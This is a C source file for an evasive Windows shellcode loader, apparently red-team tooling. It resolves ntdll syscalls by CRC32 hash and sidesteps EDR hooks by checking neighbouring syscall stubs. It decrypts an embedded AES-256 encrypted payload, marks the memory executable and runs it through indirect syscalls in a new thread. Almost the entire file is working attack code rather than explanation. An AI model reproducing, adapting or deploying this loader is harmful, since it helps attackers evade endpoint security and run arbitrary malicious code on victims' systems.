#include<Windows.h>
#include<stdio.h>
#include<winternl.h>
#include"Common.h"

#define RANGE 255
#define UP -32
#define DOWN 32

#define HASH(API) crc32h((char*) API)
#define STR "_CRC32"

#define NtAllocateVirtualMemory_CRC32    0xE0762FEB
#define NtProtectVirtualMemory_CRC32     0x5C2D1A97
#define NtCreateThreadEx_CRC32   0x2073465A
#define NtWaitForSingleObject_CRC32      0xDD554681

typedef struct _NT_SYSCALL {
	DWORD dwSSn;
	DWORD dwSyscallHash;
	PVOID pSyscallAddress;
	PVOID pSyscallInstAddress;
}NT_SYSCALL, * PNT_SYSCALL;

typedef struct _NTDLL_CONFIG {
	PDWORD pdwArraryOfAddresses; // The Virtual Addr of the array of addresses of the the NTDLL's exported functions
	PDWORD pdwArrayOfNames; // The Virtual Addr of the array of names of the NTDLL's exported functions
	PWORD pwArrayOfOrdinals; // The Virtual Addr of the array of ordinals of the NTDLL's exported functions
	DWORD dwNumberOfNames; // The number of exported functions from ntdll.dll
	ULONG_PTR uModuleAddress; // The base addr of the NTDLL.dll
}NTDLL_CONFIG, * PNTDLL_CONFIG;

// declaration for storing the values of the NTDLL file
NTDLL_CONFIG g_NTDLLConf = { 0 };

typedef struct _NTAPI_FUNC
{
	NT_SYSCALL NtAllocateVirtualMemory;
	NT_SYSCALL NtProtectVirtualMemory;
	NT_SYSCALL NtCreateThreadEx;
	NT_SYSCALL NtWaitForSingleObject;
}NTAPI_FUNC, * PNTAPI_FUNC;

NTAPI_FUNC g_Nt = { 0 };

BOOL InitNtdllConfigStructure() {
	// getting peb
	PPEB pPeb = __readgsqword(0x60);
	if (!pPeb) {
		return FALSE;
	}
	//getting the base address of ntdll!!
	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	ULONG_PTR uModuleBase = (ULONG_PTR)(pLdr->DllBase);
	if (!uModuleBase)
		return FALSE;

	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)uModuleBase;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;


	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModuleBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;


	PIMAGE_EXPORT_DIRECTORY pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(uModuleBase + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	if (!pImgExpDir)
		return FALSE;

	g_NTDLLConf.uModuleAddress = uModuleBase;
	g_NTDLLConf.dwNumberOfNames = pImgExpDir->NumberOfNames;
	g_NTDLLConf.pdwArrayOfNames = (PDWORD)(pImgExpDir->AddressOfNames + uModuleBase);
	g_NTDLLConf.pdwArraryOfAddresses = (PDWORD)(uModuleBase + pImgExpDir->AddressOfFunctions);
	g_NTDLLConf.pwArrayOfOrdinals = (PDWORD)(uModuleBase + pImgExpDir->AddressOfNameOrdinals);

	if (!g_NTDLLConf.uModuleAddress || !g_NTDLLConf.dwNumberOfNames || !g_NTDLLConf.pdwArrayOfNames || !g_NTDLLConf.pdwArraryOfAddresses
		|| !g_NTDLLConf.pwArrayOfOrdinals)
		return FALSE;

	return TRUE;
}


BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) {
	if (!g_NTDLLConf.uModuleAddress) {
		if (!InitNtdllConfigStructure())
			return FALSE;
	}

	if (dwSysHash != NULL)
		pNtSys->dwSyscallHash = dwSysHash;
	else
		return FALSE;

	for (size_t i = 0; i < g_NTDLLConf.dwNumberOfNames; i++) {
		PVOID FunctionName = (PCHAR)(g_NTDLLConf.uModuleAddress + g_NTDLLConf.pdwArrayOfNames[i]);
		PVOID FuncAddress = (PVOID)(g_NTDLLConf.pdwArraryOfAddresses[g_NTDLLConf.pwArrayOfOrdinals[i]] + g_NTDLLConf.uModuleAddress);

		if (HASH(FunctionName) == dwSysHash) {
			pNtSys->pSyscallAddress = FuncAddress;
			/*WORD cw = 0;*/

			while (TRUE) {
				if (*((PBYTE)(FuncAddress)) == 0x4c
					&& *((PBYTE)(FuncAddress)+1) == 0x8b
					&& *((PBYTE)(FuncAddress)+2) == 0xd1
					&& *((PBYTE)(FuncAddress)+3) == 0xb8
					&& *((PBYTE)(FuncAddress)+6) == 0x00
					&& *((PBYTE)(FuncAddress)+7) == 0x00) {

					BYTE high = *((PBYTE)(FuncAddress)+5);
					BYTE low = *((PBYTE)(FuncAddress)+4);

					pNtSys->dwSSn = (high << 8) | low;
					break;

				}
				// if hooked - scenario 1 
				if (*((PBYTE)FuncAddress) == 0xe9) {
					for (WORD idx = 1; idx <= RANGE; idx++) {
						//checking neighbouring syscall down
						if (*((PBYTE)(FuncAddress)+idx * DOWN) == 0x4c
							&& *((PBYTE)(FuncAddress)+1 + idx * DOWN) == 0x8b
							&& *((PBYTE)(FuncAddress)+2 + idx * DOWN) == 0xd1
							&& *((PBYTE)(FuncAddress)+3 + idx * DOWN) == 0xb8
							&& *((PBYTE)(FuncAddress)+6 + idx * DOWN) == 0x00
							&& *((PBYTE)(FuncAddress)+7 + idx * DOWN) == 0x00) {

							BYTE high = *((PBYTE)(FuncAddress)+5 + idx * DOWN);
							BYTE low = *((PBYTE)(FuncAddress)+4 + idx * DOWN);

							pNtSys->dwSSn = (high << 8) | low - idx;
							break;
						}
						//checing neighbouring syscall up
						if (*((PBYTE)(FuncAddress)+idx * UP) == 0x4c
							&& *((PBYTE)(FuncAddress)+1 + idx * UP) == 0x8b
							&& *((PBYTE)(FuncAddress)+2 + idx * UP) == 0xd1
							&& *((PBYTE)(FuncAddress)+3 + idx * UP) == 0xb8
							&& *((PBYTE)(FuncAddress)+6 + idx * UP) == 0x00
							&& *((PBYTE)(FuncAddress)+7 + idx * UP) == 0x00) {

							BYTE high = *((PBYTE)(FuncAddress)+5 + idx * UP);
							BYTE low = *((PBYTE)(FuncAddress)+4 + idx * UP);

							pNtSys->dwSSn = (high << 8) | low + idx;
							break;
						}
					}
				}
				//if hooked - scenario 2
				if (*((PBYTE)FuncAddress + 3) == 0xe9) {
					for (WORD idx = 1; idx <= RANGE; idx++) {
						//checking neighbouring syscall down
						if (*((PBYTE)(FuncAddress)+idx * DOWN) == 0x4c
							&& *((PBYTE)(FuncAddress)+1 + idx * DOWN) == 0x8b
							&& *((PBYTE)(FuncAddress)+2 + idx * DOWN) == 0xd1
							&& *((PBYTE)(FuncAddress)+3 + idx * DOWN) == 0xb8
							&& *((PBYTE)(FuncAddress)+6 + idx * DOWN) == 0x00
							&& *((PBYTE)(FuncAddress)+7 + idx * DOWN) == 0x00) {
							BYTE high = *((PBYTE)(FuncAddress)+5 + idx * DOWN);
							BYTE low = *((PBYTE)(FuncAddress)+4 + idx * DOWN);
							pNtSys->dwSSn = (high << 8) | low - idx;
							break;
						}
						//checing neighbouring syscall up
						if (*((PBYTE)(FuncAddress)+idx * UP) == 0x4c
							&& *((PBYTE)(FuncAddress)+1 + idx * UP) == 0x8b
							&& *((PBYTE)(FuncAddress)+2 + idx * UP) == 0xd1
							&& *((PBYTE)(FuncAddress)+3 + idx * UP) == 0xb8
							&& *((PBYTE)(FuncAddress)+6 + idx * UP) == 0x00
							&& *((PBYTE)(FuncAddress)+7 + idx * UP) == 0x00) {
							BYTE high = *((PBYTE)(FuncAddress)+5 + idx * UP);
							BYTE low = *((PBYTE)(FuncAddress)+4 + idx * UP);
							pNtSys->dwSSn = (high << 8) | low + idx;
							break;
						}
					}
				}
				break;
			}
		}

	}
	if (!pNtSys->pSyscallAddress)
		return FALSE;
	//code to find the syscall from ntdll.dll
	ULONG_PTR uFuncAddress = (ULONG_PTR)pNtSys->pSyscallAddress + 0xFF; // we can choose any random number
	for (DWORD z = 0, x = 1; z <= RANGE; z++, x++) {
		if (*((PBYTE)uFuncAddress + z) == 0x0F && *((PBYTE)uFuncAddress + x) == 0x05) {
			pNtSys->pSyscallInstAddress = ((ULONG_PTR)uFuncAddress + z);
			break;
		}
	}
	if (pNtSys->dwSSn != NULL && pNtSys->pSyscallAddress != NULL && pNtSys->dwSyscallHash != NULL
		&& pNtSys->pSyscallInstAddress != NULL)
		return TRUE;
	else
		return FALSE;

}
BOOL InitSyscalls() {
	if (!FetchNtSyscall(NtAllocateVirtualMemory_CRC32, &g_Nt.NtAllocateVirtualMemory)) {
		return FALSE;
	}
	if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &g_Nt.NtProtectVirtualMemory)) {
		return FALSE;
	}
	if (!FetchNtSyscall(NtCreateThreadEx_CRC32, &g_Nt.NtCreateThreadEx)) {
		return FALSE;
	}
	if (!FetchNtSyscall(NtWaitForSingleObject_CRC32, &g_Nt.NtWaitForSingleObject)) {
		return FALSE;
	}
	return TRUE;
}

/* ================================================================ *
 * Self-contained AES-256-CBC decryption (no CryptoAPI/CNG imports) *
 * Keeps the direct-syscall loader free of extra module dependencies. *
 * ================================================================ */
 /*
  * Self-contained AES-256-CBC decryption.
  * No Windows CryptoAPI / CNG imports - keeps the loader dependency-free.
  * Tables generated from the AES FIPS-197 definition.
  */
#include <stdint.h>
#include <string.h>

static const unsigned char s_sbox[256] = {
	0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
	0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
	0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
	0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
	0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
	0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
	0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
	0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
	0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
	0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
	0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
	0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
	0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
	0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
	0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
	0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,
};

static const unsigned char s_rsbox[256] = {
	0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,
	0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,
	0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,
	0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,
	0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,
	0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,
	0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,
	0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,
	0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,
	0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,
	0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,
	0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,
	0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,
	0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,
	0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,
	0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D,
};


static unsigned char xtime_f(unsigned char x) {
	return (unsigned char)((x << 1) ^ (((x >> 7) & 1) ? 0x1B : 0));
}

static unsigned char gf_mul(unsigned char a, unsigned char b) {
	unsigned char r = 0;
	while (b) {
		if (b & 1) r ^= a;
		a = xtime_f(a);
		b >>= 1;
	}
	return r;
}

static void AddRoundKey(unsigned char state[16], const unsigned char* rk) {
	for (int i = 0; i < 16; i++) state[i] ^= rk[i];
}

static void InvSubBytes(unsigned char state[16]) {
	for (int i = 0; i < 16; i++) state[i] = s_rsbox[state[i]];
}

static void InvShiftRows(unsigned char s[16]) {
	unsigned char t;
	/* row 1 : shift right by 1 */
	t = s[13]; s[13] = s[9];  s[9] = s[5]; s[5] = s[1]; s[1] = t;
	/* row 2 : shift right by 2 (self-inverse) */
	t = s[2];  s[2] = s[10];  s[10] = t;
	t = s[6];  s[6] = s[14];  s[14] = t;
	/* row 3 : shift right by 3 */
	t = s[3];  s[3] = s[7];   s[7] = s[11]; s[11] = s[15]; s[15] = t;
}

static void InvMixColumns(unsigned char state[16]) {
	for (int c = 0; c < 4; c++) {
		unsigned char* col = state + 4 * c;
		unsigned char a0 = col[0], a1 = col[1], a2 = col[2], a3 = col[3];
		col[0] = gf_mul(a0, 14) ^ gf_mul(a1, 11) ^ gf_mul(a2, 13) ^ gf_mul(a3, 9);
		col[1] = gf_mul(a0, 9) ^ gf_mul(a1, 14) ^ gf_mul(a2, 11) ^ gf_mul(a3, 13);
		col[2] = gf_mul(a0, 13) ^ gf_mul(a1, 9) ^ gf_mul(a2, 14) ^ gf_mul(a3, 11);
		col[3] = gf_mul(a0, 11) ^ gf_mul(a1, 13) ^ gf_mul(a2, 9) ^ gf_mul(a3, 14);
	}
}

static void KeyExpansion256(const unsigned char key[32], unsigned char w[240]) {
	unsigned char temp[4];
	unsigned char rcon = 0x01;
	int i;
	for (i = 0; i < 8; i++) {
		w[4 * i] = key[4 * i];
		w[4 * i + 1] = key[4 * i + 1];
		w[4 * i + 2] = key[4 * i + 2];
		w[4 * i + 3] = key[4 * i + 3];
	}
	for (i = 8; i < 60; i++) {
		temp[0] = w[4 * (i - 1)];
		temp[1] = w[4 * (i - 1) + 1];
		temp[2] = w[4 * (i - 1) + 2];
		temp[3] = w[4 * (i - 1) + 3];
		if (i % 8 == 0) {
			/* RotWord -> SubWord -> XOR Rcon */
			unsigned char t = temp[0];
			temp[0] = s_sbox[temp[1]] ^ rcon;
			temp[1] = s_sbox[temp[2]];
			temp[2] = s_sbox[temp[3]];
			temp[3] = s_sbox[t];
			rcon = xtime_f(rcon);
		}
		else if (i % 8 == 4) {
			/* SubWord on every 8th word (AES-256 extra step) */
			temp[0] = s_sbox[temp[0]];
			temp[1] = s_sbox[temp[1]];
			temp[2] = s_sbox[temp[2]];
			temp[3] = s_sbox[temp[3]];
		}
		w[4 * i] = w[4 * (i - 8)] ^ temp[0];
		w[4 * i + 1] = w[4 * (i - 8) + 1] ^ temp[1];
		w[4 * i + 2] = w[4 * (i - 8) + 2] ^ temp[2];
		w[4 * i + 3] = w[4 * (i - 8) + 3] ^ temp[3];
	}
}

static void InvCipher(unsigned char state[16], const unsigned char* w) {
	int round;
	AddRoundKey(state, w + 16 * 14);
	for (round = 13; round >= 1; round--) {
		InvShiftRows(state);
		InvSubBytes(state);
		AddRoundKey(state, w + 16 * round);
		InvMixColumns(state);
	}
	InvShiftRows(state);
	InvSubBytes(state);
	AddRoundKey(state, w);
}

/*
 * AES-256-CBC decrypt (PKCS#7).  src/dst may be the same buffer.
 * Returns the unpadded plaintext length, or 0 on failure.
 */
static size_t AES256CBCDecrypt(unsigned char* dst, const unsigned char* src, size_t len, const unsigned char key[32], const unsigned char iv[16]) {
	unsigned char w[240];
	unsigned char prev[16], ct[16], pt[16];
	unsigned char pad;
	size_t i;
	if (len == 0 || (len % 16) != 0) return 0;
	KeyExpansion256(key, w);
	memcpy(prev, iv, 16);
	for (i = 0; i < len; i += 16) {
		memcpy(ct, src + i, 16);
		memcpy(pt, ct, 16);
		InvCipher(pt, w);
		for (int j = 0; j < 16; j++) dst[i + j] = pt[j] ^ prev[j];
		memcpy(prev, ct, 16);
	}
	pad = dst[len - 1];
	if (pad == 0 || pad > 16) return 0;
	for (i = len - pad; i < len; i++)
		if (dst[i] != pad) return 0;
	return len - pad;
}

/* ================================================================ *
 * AES-256-CBC encrypted shellcode + material                       *
 * Generated with: python3 encryptor.py <shellcode.bin>             *
 * Regenerate and replace the three arrays below per engagement.    *
 * ================================================================ */
static const unsigned char Payload[288] = {
		0x8A, 0x6F, 0x3D, 0x85, 0xD3, 0x6D, 0x55, 0x29, 0x35, 0x9B, 0x10, 0x09,
		0x18, 0xF5, 0x6B, 0x29, 0xD2, 0x6B, 0x20, 0xA4, 0x7A, 0x28, 0xF2, 0x17,
		0x93, 0xEA, 0x19, 0x41, 0xAD, 0x9B, 0xC4, 0x32, 0xAB, 0x8A, 0xFC, 0x81,
		0xDE, 0x92, 0x60, 0x88, 0xDD, 0xEB, 0xE7, 0x51, 0x99, 0xDC, 0x4A, 0x79,
		0x16, 0x0D, 0x28, 0x87, 0xF5, 0x48, 0x05, 0xDF, 0xAD, 0xF0, 0xC4, 0x82,
		0x84, 0xD2, 0x70, 0x46, 0x4D, 0xDB, 0x8A, 0x24, 0x53, 0xC4, 0xED, 0x97,
		0xE1, 0xC8, 0xE9, 0x80, 0xEA, 0x15, 0x6F, 0x76, 0x04, 0x58, 0xFE, 0x54,
		0xAE, 0x7B, 0x22, 0xE9, 0x6E, 0xAF, 0x17, 0xC3, 0xD2, 0xC1, 0x63, 0x87,
		0xFA, 0x02, 0x14, 0x73, 0xD6, 0xD6, 0xFD, 0x70, 0x2A, 0xA2, 0x60, 0x54,
		0x28, 0x84, 0xD9, 0x55, 0x01, 0x74, 0xE4, 0x2D, 0x7B, 0xDD, 0xF7, 0x80,
		0x90, 0xE5, 0x86, 0x49, 0x7B, 0x8F, 0x83, 0xF7, 0xCB, 0xFA, 0x82, 0x68,
		0x80, 0x0A, 0xE6, 0x11, 0x16, 0x9E, 0x91, 0x31, 0x78, 0x60, 0xE1, 0xDE,
		0xD9, 0x89, 0xC6, 0x9D, 0xF3, 0x4F, 0x0E, 0xA6, 0x98, 0x70, 0xE9, 0xF8,
		0x71, 0x70, 0x33, 0x03, 0x03, 0x2A, 0x25, 0xD0, 0xA6, 0xB7, 0x61, 0x31,
		0x3E, 0xF1, 0x5E, 0x33, 0x02, 0x33, 0x89, 0x10, 0xC9, 0x36, 0xBF, 0x53,
		0xF2, 0xAD, 0x95, 0x1C, 0x87, 0xF4, 0xAD, 0x45, 0xA3, 0x86, 0x9A, 0x98,
		0x58, 0x9D, 0x5D, 0xB1, 0xC5, 0x16, 0x54, 0xE4, 0x54, 0xF8, 0x61, 0x7A,
		0x00, 0x1B, 0xD8, 0x3E, 0xB9, 0x7B, 0x3C, 0x79, 0x4A, 0x40, 0x91, 0xA5,
		0xAB, 0x7A, 0xAA, 0x8B, 0xF1, 0xEF, 0xBF, 0xC4, 0xF9, 0x29, 0xF6, 0x13,
		0x6C, 0x00, 0x2A, 0x4F, 0xF8, 0x41, 0x04, 0x6D, 0xF7, 0xDC, 0xE8, 0xE8,
		0x1C, 0x34, 0x50, 0x79, 0xD1, 0x80, 0xD2, 0xA0, 0xE4, 0xDC, 0x89, 0x3D,
		0x76, 0x0A, 0xC0, 0x6F, 0xAD, 0xB6, 0x00, 0xBE, 0xA0, 0x11, 0x15, 0xAA,
		0x97, 0x49, 0xEC, 0xB2, 0xFC, 0xDC, 0x3F, 0xCB, 0x8D, 0x49, 0xC2, 0xD9,
		0xAF, 0xD6, 0x38, 0x02, 0x62, 0x11, 0xC4, 0x49, 0xE5, 0x5A, 0xC7, 0x18,
};

static const unsigned char g_AesKey[32] = {
		0x69, 0xFE, 0xB4, 0xC5, 0x04, 0xB8, 0x7D, 0xA4, 0xC5, 0xE3, 0xF0, 0xB9,
		0x74, 0xD3, 0xA5, 0x9F, 0x2D, 0x36, 0x45, 0x55, 0x91, 0x71, 0x75, 0x26,
		0x76, 0xA7, 0xD8, 0x82, 0x43, 0x64, 0xC0, 0x4E,
};

static const unsigned char g_AesIv[16] = {
		0x42, 0x9E, 0xBA, 0xD2, 0x6D, 0x44, 0xD3, 0xF5, 0xE4, 0x34, 0xA1, 0xB6,
		0x07, 0xB2, 0x21, 0x08,
};
int main() {

	NTSTATUS STATUS = NULL;
	PVOID pAddress = NULL;
	SIZE_T sSize = sizeof(Payload);
	DWORD dwOld = NULL;
	HANDLE hProcess = (HANDLE)-1;
	HANDLE hThread = NULL;
	if (!InitSyscalls()) {
		return -1;
	}
	SetSSn(g_Nt.NtAllocateVirtualMemory.dwSSn, g_Nt.NtAllocateVirtualMemory.pSyscallInstAddress);
	if (STATUS = RunSyscall(hProcess, &pAddress, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0x00 || pAddress == NULL) {
		return -1;
	}
	// Decrypt the AES-256-CBC payload directly into the RW region.
	// The embedded array stays ciphertext for the lifetime of the image.
	sSize = AES256CBCDecrypt(pAddress, Payload, sizeof(Payload), g_AesKey, g_AesIv);
	if (sSize == 0) {
		return -1;
	}
	SetSSn(g_Nt.NtProtectVirtualMemory.dwSSn, g_Nt.NtProtectVirtualMemory.pSyscallAddress);
	if ((STATUS = RunSyscall(hProcess, &pAddress, &sSize, PAGE_EXECUTE_READ,
		&dwOld)) != 0x00) {
		return -1;
	}
	SetSSn(g_Nt.NtCreateThreadEx.dwSSn, g_Nt.NtCreateThreadEx.pSyscallInstAddress);
	if ((STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x00) {
		return -1;
	}
	SetSSn(g_Nt.NtWaitForSingleObject.dwSSn, g_Nt.NtWaitForSingleObject.pSyscallInstAddress);
	if ((STATUS = RunSyscall(hThread, FALSE, NULL)) != 0x00) {
		return -1;
	}


	return 0;


}
